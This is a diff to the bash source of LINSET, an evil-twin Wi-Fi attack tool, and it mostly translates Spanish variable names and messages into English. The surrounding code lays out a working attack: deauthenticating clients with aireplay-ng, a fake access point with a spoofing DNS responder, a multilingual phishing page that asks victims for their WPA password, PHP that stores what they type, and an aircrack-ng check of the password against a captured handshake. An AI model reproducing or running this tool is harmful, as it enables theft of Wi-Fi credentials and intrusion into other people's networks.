@@ -308,10 +308,10 @@ trap exitmode SIGINT SIGHUP
 # Function that cleans and leaves interfaces
 function exitmode {
 	
-	echo -e "\n\n"$white"["$red" "$white"] "$rojo"Cleaning and Closing running."$rescolor""
+	echo -e "\n\n"$white"["$red" "$white"] "$red"Cleaning and Closing running."$rescolor""
 	
 	if ps -A | grep -q aireplay-ng; then
-		echo -e ""$white"["$red"-"$white"] "$white"Killing "$gris"aireplay-ng"$rescolor""
+		echo -e ""$white"["$red"-"$white"] "$white"Killing "$grey"aireplay-ng"$rescolor""
 		killall aireplay-ng &>$linset_output_device
 	fi
 	
@@ -384,7 +384,7 @@ function exitmode {
 }
 
 # Generated listing of interface in the Script
-readarray -t webinterfaces < <(echo -e "Neutral web Interface
+readarray -t webinterfaces < <(echo -e "Neutra web Interface
 \e[1;31mLeave"$rescolor""
 )
 
@@ -445,7 +445,7 @@ DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
 DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 
 #Indonesia web interface messages
-DIALOG_WEB_INFO_IDN="UNTUK KEAMANAN Wi-Fi, Masukkan KEY <b>"$Host_ENC"</b> untuk mengakses Internet"
+DIALOG_WEB_INFO_IDN="untuk keamanan Wi-Fi, Masukkan KEY <b>"$Host_ENC"</b> untuk mengakses Internet"
 DIALOG_WEB_INPUT_IDN="<b>Masukkan Password Wi-Fi (WPA/WPA2)</b>:"
 DIALOG_WEB_SUBMIT_IDN="Submit"
 DIALOG_WEB_ERROR_IDN="<b><font color=\"red\" size=\"3\">Error</font>:</b> Password yang dimasukkan <b>TIDAK</b> Benar!</b>"
@@ -461,7 +461,7 @@ function mostrarheader(){
 	echo -e "$green#########################################################"
 	echo -e "$green#                                                       #"
 	echo -e "$green#$red		 LINSET $version" "${yellow}by ""${blue}vk496""$green                   #"
-	echo -e "$green#""${rojo}	L""${yellow}inset" "${red}I""${yellow}s" "${red}N""${yellow}ot a ""${red}S""${yellow}ocial ""${red}E""${yellow}nginering" "${red}T""${yellow}ool""$green          #"
+	echo -e "$green#""${red}	L""${yellow}inset" "${red}I""${yellow}s" "${red}N""${yellow}ot a ""${red}S""${yellow}ocial ""${red}E""${yellow}nginering" "${red}T""${yellow}ool""$green          #"
 	echo -e "$green#                                                       #"
 	echo -e "$green#########################################################""$rescolor"
 	echo
@@ -802,11 +802,11 @@ function setresolution {
 	}
 	function resF {
 		# Upper left window +0+0 (size*size+position+position)
-		TOPLEFT="-geometry 100x17+0+0" # capture data a victim ...  ( WINDOW Airodump ATAUQE )
+		TOPLEFT="-geometry 100x17+0+0" # capture data a victim ...  ( WINDOW AIRODUMP ATAUQE )
 		# Upper right window -0+0
 		TOPRIGHT="-geometry 90x27-0+0" # desautenticando
 		# Bottom left window +0-0
-		BOTTOMLEFT="-geometry 100x30+0-0" # aireplay , CHOPCHOP , FRAGMENTATION... ( WINDOW AT CATCH Airodump )
+		BOTTOMLEFT="-geometry 100x30+0-0" # aireplay , CHOPCHOP , FRAGMENTATION... ( WINDOW AT CATCH AiRODUMP )
 		# Bottom right window -0-0
 		BOTTOMRIGHT="-geometry 90x20-0-0" # Partnering with... ( RED WINDOW )
 		TOPLEFTBIG="-geometry  100x70+0+0" # Scaning object ... ( INITIAL SCAN )
@@ -880,7 +880,7 @@ function setinterface {
 		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
 		rmmod -f "$WIFIDRIVER" &>$linset_output_device 2>&1
 		
-		for annoying in "${softwaremolesto[@]}"; do
+		for molesto in "${softwaremolesto[@]}"; do
 			killall "$molesto" &>$linset_output_device
 		done
 		sleep 0.5
@@ -981,16 +981,16 @@ function selection {
 	mostrarheader
 	
 	
-	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
+	LINES_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
 	
-	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
+	if [ $LINES_WIFIS_CSV -le 3 ]; then
 		vk496 && break
 	fi
 	
-	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Client)' | awk -F : '{print $1}'`
 	linap=`expr $linap - 1`
 	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
-	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
+	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clients.csv 
 	echo "                         List The AP Object "
 	echo ""
 	echo " #      MAC                      CHAN    SECU     PWR    ESSID"
@@ -1004,13 +1004,13 @@ function selection {
 		if [ $longueur -ge 17 ]; then
 			i=$(($i+1))
 			POWER=`expr $POWER + 100`
-			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
+			CLIENT=`cat $DUMP_PATH/clients.csv | grep $MAC`
 			
-			if [ "$CLIENTE" != "" ]; then
-				CLIENTE="*" 
+			if [ "$CLIENT" != "" ]; then
+				CLIENT="*" 
 			fi
 			
-			echo -e " ""$green"$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green"$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green"$ESSID""$rescolor""
+			echo -e " ""$green"$i")"$white"$CLIENT\t""$yellow"$MAC"\t""$green"$CHANNEL"\t""$red" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green"$ESSID""$rescolor""
 			aidlenght=$IDLENGTH
 			assid[$i]=$ESSID
 			achannel[$i]=$CHANNEL
@@ -1048,9 +1048,9 @@ function selection {
 # Select mode FakeAP
 function askAP {
 		
-	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
+	DIGIT_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
 	
-	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
+	if [ $DIGIT_WIFIS_CSV -le 15 ]; then
 		selection && break
 	fi
 	
@@ -1118,7 +1118,7 @@ function handshakelocation {
 	infoap
 	echo
 	echo -e "Handshake enter the path to audit (E.x: $red/root/micaptura.cap$rescolor)"
-	echo -e "Press ${amarillo}ENTER$rescolor to skip"
+	echo -e "Press ${yellow}ENTER$rescolor to skip"
 	echo
 	echo -n "Route: "
 	echo -ne "$red"
@@ -1139,10 +1139,10 @@ function handshakelocation {
 					echo "Handshake incomplete."
 					echo
 					sleep 4
-					echo "You can try your luck with aircrack -ng , since it is more permissive..."
-					echo "Want to try with aircrack -ng instead of pyrit to check the handshake? [ ENTER = NO ]"
+					echo "You can try your luck with aircrack-ng , since it is more permissive..."
+					echo "Want to try with aircrack-ng instead of pyrit to check the handshake? [ ENTER = NO ]"
 					echo
-					echo -n "Request: "
+					echo -n "Reply: "
 					echo -ne "$red"
 					read handshakeloc_aircrack
 					echo -ne "$rescolor"
@@ -1268,9 +1268,9 @@ function deauth {
 		esp )
 			DEAUTH=deauthesp
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
-			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
+			LINES_CLIENTS=`echo "$HOST" | wc -m | awk '{print $1}'`
 			
-			if [ $LINEAS_CLIENTES -le 5 ]; then
+			if [ $LINES_CLIENTS -le 5 ]; then
 				DEAUTH=deauthall
 				capture & $DEAUTH
 				CSVDB=$Host_MAC-01.csv
@@ -1345,7 +1345,7 @@ function checkhandshake {
 			webinterface
 			break
 		else
-			Handshake_statuscheck="${rojo}poor$rescolor"
+			Handshake_statuscheck="${red}poor$rescolor"
 		fi
 	elif [ "$handshakemode" = "hard" ]; then
 		cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap &>$linset_output_device
@@ -1415,10 +1415,10 @@ function webinterface {
 			
 			echo
 			echo -n "#? "
-			read linea
+			read line
 			language=${webinterfaceslenguage[$line]}
 			
-			if [ "$linea" = "1" ]; then
+			if [ "$line" = "1" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
@@ -1429,7 +1429,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
 				NEUTRA
 				break
-			elif [ "$linea" = "2" ]; then
+			elif [ "$line" = "2" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
@@ -1440,7 +1440,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
 				NEUTRA
 				break
-			elif [ "$linea" = "3" ]; then
+			elif [ "$line" = "3" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
@@ -1451,7 +1451,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
 				NEUTRA
 				break
-			elif [ "$linea" = "4" ]; then
+			elif [ "$line" = "4" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
@@ -1462,7 +1462,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
 				NEUTRA
 				break
-			elif [ "$linea" = "5" ]; then
+			elif [ "$line" = "5" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
@@ -1473,7 +1473,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
 				NEUTRA
 				break
-			elif [ "$linea" = "6" ]; then
+			elif [ "$line" = "6" ]; then
 				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IND
 				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IDN
 				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IDN
@@ -1484,7 +1484,7 @@ function webinterface {
 				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IDN
 				NEUTRA
 				break
-			elif [ "$linea" = "7" ]; then
+			elif [ "$line" = "7" ]; then
 				continue
 			fi
 		fi
@@ -1522,7 +1522,7 @@ fclose(\$fp);
 // Write the name of text file where data will be store
 \$filename = \"$DUMP_PATH/data.txt\";
 \$filename2 = \"$DUMP_PATH/status.txt\";
-\$intento = \"$DUMP_PATH/intento\";
+\$attempt = \"$DUMP_PATH/attempt\";
 
 
 // Marge all the variables with text in a single variable. 
@@ -1547,8 +1547,8 @@ fclose(\$file);
 
 
 \$archive = fopen(\$attempt, \"w\");
-fwrite(\$archivo,\"\n\");
-fclose(\$archivo);
+fwrite(\$archive,\"\n\");
+fclose(\$archive);
 
 while(1) 
 {
@@ -1559,7 +1559,7 @@ if (file_get_contents(\"\$attempt\") == 2) {
 	} 
 if (file_get_contents(\"\$attempt\") == 1) {
 	    header(\"location:error.html\");
-	    unlink(\$intento);
+	    unlink(\$attempt);
 	    break;
 	}
 	
@@ -1669,8 +1669,8 @@ if __name__ == '__main__':
     while 1:
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
-      udps.sendto(p.respuesta(ip), addr)
-      print 'Respuesta: %s -> %s' % (p.dominio, ip)
+      udps.sendto(p.Reply(ip), addr)
+      print 'Reply: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
     print 'Finalizando'
     udps.close()
@@ -1818,7 +1818,7 @@ function handshakecheck {
 		echo "if [ -f $DUMP_PATH/attempt ]; then
 		
 		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
-		echo \"2\">$DUMP_PATH/intento
+		echo \"2\">$DUMP_PATH/attempt
 		break
 		else
 		echo \"1\">$DUMP_PATH/attempt
@@ -1844,19 +1844,19 @@ function handshakecheck {
 		">>$DUMP_PATH/handcheck
 	fi
 	
-	echo "readarray -t CLIENTESDHCP < <(nmap -sP -oG - $RANG_IP.100-110 2>&1 | grep Host )
-	
+	echo "readarray -t CLIENTSDHCP < <(nmap -sP -oG - $RANG_IP.100-110 2>&1 | grep Host )
+
 	echo
-	echo -e \"  POINT ACCESS :\"
+	echo -e \"  POINT ACCESS:\"
 	echo -e \"    Name............: "$white"$Host_SSID"$rescolor"\"
 	echo -e \"    MAC.............: "$yellow"$Host_MAC"$rescolor"\"
 	echo -e \"    Channel.........: "$white"$Host_CHAN"$rescolor"\"
-	echo -e \"    Manufacturer....: "$green"$Host_MAC_MODEL"$rescolor"\"
-	echo -e \"    Time active.....: "$gray"\$them\$hours:\$in the\$minutes:\$is\$seconds"$rescolor"\"
+	echo -e \"    Manufactur......: "$green"$Host_MAC_MODEL"$rescolor"\"
+	echo -e \"    Time active.....: "$gray"\$ih\$hours:\$im\$minutes:\$is\$seconds"$rescolor"\"
 	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
-	echo -e \"    Client..........: "$blue"\$(cat $DUMP_PATH/clients.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
+	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clients.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
 	echo
-	echo -e \"  CLIENT ACTIVE:\"
+	echo -e \"  CLIENTS ACTIVE:\"
 	
 	x=0
 	for client in \"\${CLIENTSDHCP[@]}\"; do
@@ -1864,19 +1864,19 @@ function handshakecheck {
 	  CLIENT_IP=\$(echo \$client| cut -d \" \" -f2)
 	  CLIENT_MAC=\$(nmap -sP \$CLIENT_IP 2>&1 | grep -i mac | cut -d \" \" -f3 | tr [:upper:] [:lower:])
 	  
-	  if [ \"\$(echo \$CLIENT_MAC| wc -m)\" != \"18\" ]; then
+	if [ \"\$(echo \$CLIENT_MAC| wc -m)\" != \"18\" ]; then
 		CLIENT_MAC=\"xx:xx:xx:xx:xx:xx\"
 	  fi
 	  
-	  CLIENT_MANUFACTURER=\$(macchanger -l | grep \"\$(echo \"\$CLIENT_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+	  CLIENT_MANUFACTUR=\$(macchanger -l | grep \"\$(echo \"\$CLIENT_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
 	  
 	  if echo \$CLIENT_MAC| grep -q x; then
-		    CLIENT_MANUFACTURER=\"unknown\"
+		    CLIENT_MANUFACTUR=\"unknown\"
 	  fi
 	  
 	  CLIENT_HOSTNAME=\$(echo \$client| cut -d \" \" -f 3 | cut -d \"(\" -f2 | cut -d \")\" -f1)
 	  
-	  echo -e \"    $green\$x) $red\$CLIENT_IP $yellow\$CLIENTE_MAC $rescolor($blue\$CLIENTE_FABRICANTE$rescolor) $green\$CLIENT_HOSTNAME$rescolor\"   
+	  echo -e \"    $green\$x) $red\$CLIENT_IP $yellow\$CLIENT_MAC $rescolor($blue\$CLIENT_MANUFACTUR$rescolor) $green\$CLIENT_HOSTNAME$rescolor\"   
 	done
 	
 	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
@@ -1917,7 +1917,7 @@ function handshakecheck {
 	BSSID: $Host_MAC ($Host_MAC_MODEL)
 	Channel: $Host_CHAN
 	Security: $Host_ENC
-	Time: \$them\$hours:\$in the\$minutes:\$is\$seconds
+	Time: \$ih\$hours:\$im\$minutes:\$is\$seconds
 	Password: \$(cat $DUMP_PATH/data.txt)
 	\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck
 	
@@ -1990,7 +1990,7 @@ function matartodo {
 ######################################### < INTERFACES WEB > ########################################
 
 # Create the content of the web interface
-function NEUTRAL {
+function NEUTRA {
 	
 	if [ ! -d $DUMP_PATH/data ]; then
 		mkdir $DUMP_PATH/data
